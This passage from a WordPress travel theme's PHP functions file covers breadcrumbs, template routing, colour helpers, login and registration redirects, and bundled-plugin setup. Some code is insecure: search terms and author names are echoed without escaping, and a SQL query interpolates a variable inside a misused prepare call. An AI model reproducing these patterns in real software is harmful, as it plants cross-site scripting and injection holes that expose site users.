                    $aventura_cat_link_1       = get_term_link($aventura_taxonomy_terms_1[0]->term_id, $aventura_custom_taxonomy_1);
                    $aventura_cat_name_1       = $aventura_taxonomy_terms_1[0]->name;

                }

                // Check if the post is in a category
                if(!empty($aventura_last_category)) {
                    echo balanceTags($aventura_cat_display);
                    echo '<li class="item-current item-' . esc_attr($post->ID) . '"><strong class="bread-current bread-' . esc_attr($post->ID) . '" title="' . get_the_title() . '">' . get_the_title() . '</strong></li>';

                    // Else if post is in a custom taxonomy
                } else if(!empty($aventura_cat_id)) {

                    echo '<li class="item-cat item-cat-' . esc_attr($aventura_cat_id) . ' item-cat-' . esc_attr($aventura_cat_nicename) . '"><a class="bread-cat bread-cat-' . esc_attr($aventura_cat_id) . ' bread-cat-' . esc_attr($aventura_cat_nicename) . '" href="' . esc_url($aventura_cat_link) . '" title="' . esc_attr($aventura_cat_name) . '">' . esc_html($aventura_cat_name) . '</a></li>';
                    echo '<li class="separator"> ' . esc_html($aventura_separator) . ' </li>';
                    echo '<li class="item-current item-' . esc_attr($post->ID) . '"><strong class="bread-current bread-' . esc_attr($post->ID) . '" title="' . get_the_title() . '">' . get_the_title() . '</strong></li>';

                } else if(!empty($aventura_cat_id_1)) {

                    echo '<li class="item-cat item-cat-' . esc_attr($aventura_cat_id_1) . ' item-cat-' . esc_attr($aventura_cat_nicename_1) . '"><a class="bread-cat bread-cat-' . esc_attr($aventura_cat_id_1) . ' bread-cat-' . esc_attr($aventura_cat_nicename_1) . '" href="' . esc_url($aventura_cat_link_1) . '" title="' . esc_attr($aventura_cat_name_1) . '">' . esc_html($aventura_cat_name_1) . '</a></li>';
                    echo '<li class="separator"> ' . esc_html($aventura_separator) . ' </li>';
                    echo '<li class="item-current item-' . esc_attr($post->ID) . '"><strong class="bread-current bread-' . esc_attr($post->ID) . '" title="' . get_the_title() . '">' . get_the_title() . '</strong></li>';

                }else {
                    echo '<li class="ssss item-current item-' . esc_attr($post->ID) . '"><strong class="bread-current bread-' . esc_attr($post->ID) . '" title="' . get_the_title() . '">' . get_the_title() . '</strong></li>';

                }

            } else if ( is_category() ) {

                // Category page
                echo '<li class="item-current item-cat"><strong class="bread-current bread-cat">' . single_cat_title('', false) . '</strong></li>';

            } else if ( is_page() ) {

                // Standard page
                if( $post->post_parent ){

                    // If child page, get parents
                    $aventura_anc = get_post_ancestors( $post->ID );

                    // Get parents in the right order
                    $aventura_anc = array_reverse($aventura_anc);

                    // Parent page loop
                    if ( !isset( $aventura_parents ) ) $aventura_parents = null;
                    foreach ( $aventura_anc as $aventura_ancestor ) {
                        $aventura_parents .= '<li class="item-parent item-parent-' . esc_attr($aventura_ancestor) . '"><a class="bread-parent bread-parent-' . esc_attr($aventura_ancestor) . '" href="' . get_permalink($aventura_ancestor) . '" title="' . get_the_title($aventura_ancestor) . '">' . get_the_title($aventura_ancestor) . '</a></li>';
                        $aventura_parents .= '<li class="separator separator-' . esc_attr($aventura_ancestor) . '"> ' . esc_html($aventura_separator) . ' </li>';
                    }

                    // Display parent pages
                    echo balanceTags($aventura_parents);

                    // Current page
                    echo '<li class="item-current item-' . esc_attr($post->ID) . '"><strong title="' . get_the_title() . '"> ' . get_the_title() . '</strong></li>';

                } else {

                    // Just display current page if not parents
                    echo '<li class="item-current item-' . esc_attr($post->ID) . '"><strong class="bread-current bread-' . esc_attr($post->ID) . '"> ' . get_the_title() . '</strong></li>';

                }

            } else if ( is_tag() ) {

                // Tag page

                // Get tag information
                $aventura_term_id        = get_query_var('tag_id');
                $aventura_taxonomy       = 'post_tag';
                $aventura_args           = 'include=' . $aventura_term_id;
                $aventura_terms          = get_terms( $aventura_taxonomy, $aventura_args );
                $aventura_get_term_id    = $aventura_terms[0]->term_id;
                $aventura_get_term_slug  = $aventura_terms[0]->slug;
                $aventura_get_term_name  = $aventura_terms[0]->name;

                // Display the tag name
                echo '<li class="item-current item-tag-' . esc_attr($aventura_get_term_id) . ' item-tag-' . esc_attr($aventura_get_term_slug) . '"><strong class="bread-current bread-tag-' . esc_attr($aventura_get_term_id) . ' bread-tag-' . esc_attr($aventura_get_term_slug) . '">' . esc_html($aventura_get_term_name) . '</strong></li>';

            } elseif ( is_day() ) {

                // Day archive

                // Year link
                echo '<li class="item-year item-year-' . get_the_time('Y') . '"><a class="bread-year bread-year-' . get_the_time('Y') . '" href="' . get_year_link( get_the_time('Y') ) . '" title="' . get_the_time('Y') . '">' . get_the_time('Y') . esc_html__(' Archives','aventura') . '</a></li>';
                echo '<li class="separator separator-' . get_the_time('Y') . '"> ' . esc_html($aventura_separator) . ' </li>';

                // Month link
                echo '<li class="item-month item-month-' . get_the_time('m') . '"><a class="bread-month bread-month-' . get_the_time('m') . '" href="' . get_month_link( get_the_time('Y'), get_the_time('m') ) . '" title="' . get_the_time('M') . '">' . get_the_time('M') . esc_html__(' Archives','aventura') . '</a></li>';
                echo '<li class="separator separator-' . get_the_time('m') . '"> ' . esc_html($aventura_separator) . ' </li>';

                // Day display
                echo '<li class="item-current item-' . get_the_time('j') . '"><strong class="bread-current bread-' . get_the_time('j') . '"> ' . get_the_time('jS') . ' ' . get_the_time('M') . esc_html__(' Archives','aventura') . '</strong></li>';

            } else if ( is_month() ) {

                // Month Archive

                // Year link
                echo '<li class="item-year item-year-' . get_the_time('Y') . '"><a class="bread-year bread-year-' . get_the_time('Y') . '" href="' . get_year_link( get_the_time('Y') ) . '" title="' . get_the_time('Y') . '">' . get_the_time('Y') . esc_html__(' Archives','aventura') . '</a></li>';
                echo '<li class="separator separator-' . get_the_time('Y') . '"> ' . esc_html($aventura_separator) . ' </li>';

                // Month display
                echo '<li class="item-month item-month-' . get_the_time('m') . '"><strong class="bread-month bread-month-' . get_the_time('m') . '" title="' . get_the_time('M') . '">' . get_the_time('M') . esc_html__(' Archives','aventura') . '</strong></li>';

            } else if ( is_year() ) {

                // Display year archive
                echo '<li class="item-current item-current-' . get_the_time('Y') . '"><strong class="bread-current bread-current-' . get_the_time('Y') . '" title="' . get_the_time('Y') . '">' . get_the_time('Y') . esc_html__(' Archives','aventura') . '</strong></li>';

            } else if ( is_author() ) {

                // Auhor archive

                // Get the author information
                global $author;
                $aventura_userdata = get_userdata( $author );

                // Display author name
                echo '<li class="item-current item-current-' . esc_attr($aventura_userdata->user_nicename) . '"><strong class="bread-current bread-current-' . $aventura_userdata->user_nicename . '" title="' . $aventura_userdata->display_name . '">' . esc_html__('Author: ','aventura') . $aventura_userdata->display_name . '</strong></li>';

            } else if ( get_query_var('paged') ) {

                // Paginated archives
                echo '<li class="item-current item-current-' . get_query_var('paged') . '"><strong class="bread-current bread-current-' . get_query_var('paged') . '" title="Page ' . get_query_var('paged') . '">'.esc_html__('Page','aventura') . ' ' . get_query_var('paged') . '</strong></li>';

            } else if ( is_search() ) {

                // Search results page
                echo '<li class="item-current item-current-' . get_search_query() . '"><strong class="bread-current bread-current-' . get_search_query() . '" title="' . esc_html__('Search results for: ','aventura') . get_search_query() . '">' . esc_html__('Search results for: ','aventura') . get_search_query() . '</strong></li>';

            } elseif ( is_404() ) {

                // 404 page
                echo '<li>' . esc_html__('Error 404','aventura') . '</li>';
            }

            echo '</ul>';
            echo '</div>';

        }

    }
endif;
/*
 * TWITTER AMPERSAND ENTITY DECODE
 */
if( ! function_exists( 'aventura_social_title' )):
    function aventura_social_title( $aventura_title ) {
        $aventura_title = html_entity_decode( $aventura_title );
        $aventura_title = urlencode( $aventura_title );
        return $aventura_title;
    }
endif;

/****************************************************************************************************************
 * Fuction override post_class()
 * */

if ( ! function_exists( 'aventura_post_classes' ) ) :
    function aventura_post_classes( $aventura_classes, $aventura_class, $post_id ) {
        if( is_category() || is_tag() || is_search() || is_author() || is_archive() || is_home() ){
            $aventura_classes[] = 'tz-blog-item';
        }

        if(is_single()){
            $aventura_classes[] = 'tz-blog-single-item';
        }
        return $aventura_classes;
    }
endif;
add_filter( 'post_class', 'aventura_post_classes', 10, 3 );


/**
 * Tour Function.
 */

function aventura_template( $aventura_template = '' ) {
    if ( is_tax('tour-category') || is_tax('tour-language') ) {
        $aventura_template = locate_template( 'archive-tour.php' );
    }elseif( is_tax('branchs-category') ){
        $aventura_template = locate_template( 'archive-branchs.php' );
    }
    $aventura_post_type = get_query_var('post_type');
    if ( is_search() && $aventura_post_type == 'tour' ) {
        return locate_template( 'archive-tour.php' );
    }

    return $aventura_template;
}
add_filter( 'taxonomy_template', 'aventura_template' );
add_filter( 'template_include', 'aventura_template', 99 );

/*
 * redirect home function
 */
if ( ! function_exists( 'aventura_redirect_home' ) ) {
    function aventura_redirect_home() {
        echo '<script> location.replace("'.esc_url( home_url("/") ).'"); </script>';
        exit;
    }
}
add_action( 'aventura_wrong_data', 'aventura_redirect_home' );

/*
 * get logo url function
 */
if ( ! function_exists( 'aventura_logo_url' ) ) {
    function aventura_logo_url() {
        global $aventura_options;
        $aventura_url = '';
        if ( ! empty( $aventura_options['aventura_logo_images'] ) && ! empty( $aventura_options['aventura_logo_images']['url'] ) ) {
            $aventura_url = $aventura_options['aventura_logo_images']['url'];
        } else {
            $aventura_url = get_template_directory_uri() . '/logo.png';
        }
        return $aventura_url;
    }
}

/*
 * Get Count Post By Meta
 */
if ( ! function_exists( 'aventura_get_post_count_by_meta' ) ) {
    function aventura_get_post_count_by_meta( $aventura_meta_key, $aventura_meta_value, $aventura_post_type = 'post' ) {
        $aventura_args = array(
            'post_type' => $aventura_post_type,
            'numberposts'	=> -1,
            'post_status'	=> 'publish',
        );
        if ( $aventura_meta_key && $aventura_meta_value ) {
            if ( is_array($aventura_meta_value) ) {
                $aventura_args['meta_query'][] = array('key' => $aventura_meta_key, 'value' => $aventura_meta_value, 'compare' => 'IN');
            }elseif( $aventura_meta_value == 'all' ){
                $aventura_args['meta_query'][] = array('key' => $aventura_meta_key);
            }else {
                $aventura_args['meta_query'][] = array('key' => $aventura_meta_key, 'value' => $aventura_meta_value);
            }
        }
        $aventura_posts = get_posts($aventura_args);
        $aventura_count = count($aventura_posts);
        return $aventura_count;
    }
}

/*
 * Get Count All Comment By Post Type
 */
if ( ! function_exists( 'aventura_get_all_comments_of_post_type' ) ) {
    function aventura_get_all_comments_of_post_type($aventura_post_type){
        global $wpdb;
        $aventura_query = $wpdb->prepare("SELECT COUNT(comment_ID) FROM $wpdb->comments WHERE comment_post_ID in ( SELECT ID FROM $wpdb->posts WHERE post_type = '$aventura_post_type' AND post_status = 'publish') AND comment_approved = '1'", 'foo');
        $aventura_comments = $wpdb->get_var($aventura_query);
        return $aventura_comments;
    }
}

/********************************************************************************
 * Function Override Number Posts Per Page
 */

function aventura_set_post_per_page( $query ) {
    global $aventura_options;
    $aventura_branchs_per_page = ((!isset($aventura_options['aventura_branchs_per_page'])) || empty($aventura_options['aventura_branchs_per_page'])) ? '8' : $aventura_options['aventura_branchs_per_page'];

    //Don't change in WordPress admin
    if ( is_admin() || ! $query->is_main_query() )
        return;

    if ( $query->is_post_type_archive( 'branchs' ) || is_tax('branchs-category') ) {
        $query->set('posts_per_page', $aventura_branchs_per_page);
        return;
    }
}
add_action( 'pre_get_posts', 'aventura_set_post_per_page', 1 );

/*
 * Function hex--rgb
 */
function aventura_hex2rgb($aventura_hex,$aventura_o) {
    $aventura_hex = str_replace("#", "", $aventura_hex);

    if(strlen($aventura_hex) == 3) {
        $aventura_r = hexdec(substr($aventura_hex,0,1).substr($aventura_hex,0,1));
        $aventura_g = hexdec(substr($aventura_hex,1,1).substr($aventura_hex,1,1));
        $aventura_b = hexdec(substr($aventura_hex,2,1).substr($aventura_hex,2,1));
    } else {
        $aventura_r = hexdec(substr($aventura_hex,0,2));
        $aventura_g = hexdec(substr($aventura_hex,2,2));
        $aventura_b = hexdec(substr($aventura_hex,4,2));
    }
    $aventura_rgba = array($aventura_r, $aventura_g, $aventura_b,$aventura_o);
    return implode(",", $aventura_rgba); // returns the rgb values separated by commas
//                                return $rgb; // returns an array with the rgb values
}

function aventura_colourBrightness($hex, $percent) {
    // Work out if hash given
    $hash = '';
    if (stristr($hex,'#')) {
        $hex = str_replace('#','',$hex);
        $hash = '#';
    }
    /// HEX TO RGB
    $rgb = array(hexdec(substr($hex,0,2)), hexdec(substr($hex,2,2)), hexdec(substr($hex,4,2)));
    //// CALCULATE
    for ($i=0; $i<3; $i++) {
        // See if brighter or darker
        if ($percent > 0) {
            // Lighter
            $rgb[$i] = round($rgb[$i] * $percent) + round(255 * (1-$percent));
        } else {
            // Darker
            $positivePercent = $percent - ($percent*2);
            $rgb[$i] = round($rgb[$i] * $positivePercent) + round(0 * (1-$positivePercent));
        }
        // In case rounding up causes us to go to 256
        if ($rgb[$i] > 255) {
            $rgb[$i] = 255;
        }
    }
    //// RBG to Hex
    $hex = '';
    for($i=0; $i < 3; $i++) {
        // Convert the decimal digit to hex
        $hexDigit = dechex($rgb[$i]);
        // Add a leading zero if necessary
        if(strlen($hexDigit) == 1) {
            $hexDigit = "0" . $hexDigit;
        }
        // Append to the hex string
        $hex .= $hexDigit;
    }
    return $hash.$hex;
}

/*
 * get permalink page
 */
if ( ! function_exists( 'aventura_get_permalink_clang' ) ) {
    function aventura_get_permalink_clang( $post_id )
    {
        $aventura_url = "";
        if ( function_exists('icl_object_id') ) {
            $aventura_language = ICL_LANGUAGE_CODE;

            $aventura_lang_post_id = icl_object_id( $post_id , 'page', true, $aventura_language );

            if( 0 != $aventura_lang_post_id ) {
                $aventura_url = get_permalink( $aventura_lang_post_id );
            } else {
                // No page found, it's most likely the homepage
                global $sitepress;
                $aventura_url = $sitepress->language_url( $aventura_language );
            }
        } else {
            $aventura_url = get_permalink( $post_id );
        }

        return esc_url( $aventura_url );
    }
}

/*
 * get current page url
 */
if ( ! function_exists( 'aventura_get_current_page_url' ) ) {
    function aventura_get_current_page_url() {
        global $wp;
        return esc_url( home_url(add_query_arg(array(),$wp->request)) );
    }
}

/*
 * get redirect page after login page url function
 */
if ( ! function_exists( 'aventura_start_page_url' ) ) {
    function aventura_start_page_url() {
        global $aventura_options;
        $start_page_url = '';
        if ( ! empty( $aventura_options['aventura_login_redirect_page'] ) ) {
            $start_page_url = aventura_get_permalink_clang( $aventura_options['aventura_login_redirect_page'] );
        } else {
            $start_page_url = esc_url( admin_url('/') );
        }
        return $start_page_url;
    }
}
/*
 * login failed function
 */
add_action( 'wp_login_failed', 'aventura_login_failed' );

if ( ! function_exists( 'aventura_login_failed' ) ) {
    function aventura_login_failed( $user ) {
        global $aventura_options;
        if ( ! empty( $aventura_options['aventura_login_page'] ) ) {
            wp_redirect( add_query_arg( array( 'login' => 'failed', 'user' => $user ), aventura_get_permalink_clang( $aventura_options['aventura_login_page'] ) ) );
            exit();
        }
    }
}

/*
 * lost password function
 */
add_action( 'lost_password', 'aventura_lost_password' );

if ( ! function_exists( 'aventura_lost_password' ) ) {
    function aventura_lost_password() {
        global $aventura_options;
        if ( ! empty( $aventura_options['aventura_lostpassword_page'] ) && empty( $_GET['no_redirect'] ) ) {
            wp_redirect( add_query_arg( $_GET, aventura_get_permalink_clang( $aventura_options['aventura_lostpassword_page'] ) ) );
            exit;
        }
    }
}

/*
 * Authentication function
 */
add_filter( 'authenticate', 'aventura_authenticate', 1, 3);

if ( ! function_exists( 'aventura_authenticate' ) ) {
    function aventura_authenticate(  $user, $username, $password  ){
        global $aventura_options;
        if ( ! empty( $aventura_options['aventura_login_page'] ) && ( empty( $username ) || empty( $password ) ) && empty( $_GET['no_redirect'] ) ) {
            wp_redirect( add_query_arg( $_GET, aventura_get_permalink_clang( $aventura_options['aventura_login_page'] ) ) );
            exit;
        }
    }
}

// unsuccessfull registration
add_action('register_post', 'binda_register_fail_redirect', 99, 3);

function binda_register_fail_redirect( $sanitized_user_login, $user_email, $errors ){
    //this line is copied from register_new_user function of wp-login.php
    $errors = apply_filters( 'registration_errors', $errors, $sanitized_user_login, $user_email );
    //this if check is copied from register_new_user function of wp-login.php
    if ( $errors->get_error_code() ){
        //setup your custom URL for redirection
//        $redirect_url = get_bloginfo('url') . '/register';

        global $aventura_options;
        $aventura_register_page = ((!isset($aventura_options['aventura_register_page'])) || empty($aventura_options['aventura_register_page'])) ? '' : $aventura_options['aventura_register_page'];

        //add error codes to custom redirection URL one by one
        foreach ( $errors->errors as $e => $m ){
            $redirect_url = add_query_arg( $e, '1', aventura_get_permalink_clang($aventura_register_page));
        }
        //add finally, redirect to your custom page with all errors in attributes
        wp_redirect( $redirect_url );
        exit;
    }
}


/**
 * Include the TGM_Plugin_Activation class.
 */
require get_template_directory() . '/plugins/class-tgm-plugin-activation.php';

add_action( 'tgmpa_register', 'aventura_register_required_plugins' );
function aventura_register_required_plugins() {

    /**
     * Array of plugin arrays. Required keys are name and slug.
     * If the source is NOT from the .org repo, then source is also required.
     */
    $aventura_plugins = array(

        // This is an example of how to include a plugin pre-packaged with a theme
        array(
            'name'     				=> esc_html__('Aventura Plugin','aventura'), // The plugin name
            'slug'     				=> 'aventura-plugin', // The plugin slug (typically the folder name)
            'source'   				=> get_template_directory() . '/plugins/aventura-plugin.zip', // The plugin source
            'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
            'version' 				=> '1.3.3', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
            'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
            'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
            'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
        ),
        array(
            'name'     				=> esc_html__('Vafpress Post Formats UI','aventura'), // The plugin name
            'slug'     				=> 'vafpress-post-formats-ui-develop', // The plugin slug (typically the folder name)
            'source'   				=> get_template_directory() . '/plugins/vafpress-post-formats-ui-develop.zip', // The plugin source
            'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
            'version' 				=> '1.5', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
            'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
            'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
            'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
        ),

        array(
            'name'     				=> esc_html__('Slider Revolution','aventura'), // The plugin name
            'slug'     				=> 'revslider', // The plugin slug (typically the folder name)
            'source'   				=> get_template_directory() . '/plugins/revslider.zip', // The plugin source
            'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
            'version' 				=> '5.4.7.4', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
            'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
            'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
            'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
        ),
        array(
            'name'     				=> esc_html__('WPBakery Visual Composer','aventura'), // The plugin name
            'slug'     				=> 'js_composer', // The plugin slug (typically the folder name)
            'source'   				=> get_template_directory() . '/plugins/js_composer.zip', // The plugin source
            'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
            'version' 				=> '5.6', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
            'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
            'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
            'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
        ),
        array(
            'name'     				=> esc_html__('TZ Instagram Widget','aventura'), // The plugin name
            'slug'     				=> 'tz-instagram-widget', // The plugin slug (typically the folder name)
            'source'   				=> get_template_directory() . '/plugins/tz-instagram-widget.zip', // The plugin source
            'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
            'version' 				=> '1.0', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
            'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
            'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
            'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
        ),

        // This is an example of how to include a plugin from the WordPress Plugin Repository
        array(
            'name'      => esc_html__('Redux Framework','aventura'),
            'slug'      => 'redux-framework',
            'required'  => true,
        ),
        array(
            'name'      => esc_html__('Meta Box','aventura'),
            'slug'      => 'meta-box',
            'required'  => true,
        ),
        array(
            'name'    => 'WooCommerce',
            'slug'    => 'woocommerce',
            'required'  => true,
        ),
        array(
            'name'    => 'Quick View WooCommerce',
            'slug'    => 'quick-view-woocommerce',
            'required'  => true,
        ),
        array(
            'name'      => esc_html__('Shortcodes Ultimate','aventura'),
            'slug'      => 'shortcodes-ultimate',
            'required'  => true,
        ),
        array(
            'name'      => esc_html__('Contact Form 7','aventura'),
            'slug'      => 'contact-form-7',
            'required'  => true,
        ),
        array(
            'name'      => esc_html__('Newsletter','aventura'),
            'slug'      => 'newsletter',
            'required'  => true,
        ),
        array(
            'name'      => esc_html__('DW Twitter','aventura'),
            'slug'      => 'dw-twitter',
            'required'  => true,
        ),
        array(
            'name'      => esc_html__('WP Editor Widget','aventura'),
            'slug'      => 'wp-editor-widget',
            'required'  => true,
        ),
    );

    /**
     * Array of configuration settings. Amend each line as needed.
     * If you want the default strings to be available under your own theme domain,
     * leave the strings uncommented.
     * Some of the strings are added into a sprintf, so see the comments at the
     * end of each line for what each argument will be.
     */
    $aventura_config = array(
        'id'           => 'aventura',                 // Unique ID for hashing notices for multiple instances of TGMPA.
        'default_path' => '',                      // Default absolute path to bundled plugins.
        'menu'         => 'tgmpa-install-plugins', // Menu slug.
        'parent_slug'  => 'themes.php',            // Parent menu slug.
        'capability'   => 'edit_theme_options',    // Capability needed to view plugin install page, should be a capability associated with the parent menu used.
        'has_notices'  => true,                    // Show admin notices or not.
        'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
        'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
        'is_automatic' => false,                   // Automatically activate plugins after installation or not.
        'message'      => '',                          // Message to output right before the plugins table.
    );

    tgmpa( $aventura_plugins, $aventura_config );
}
?>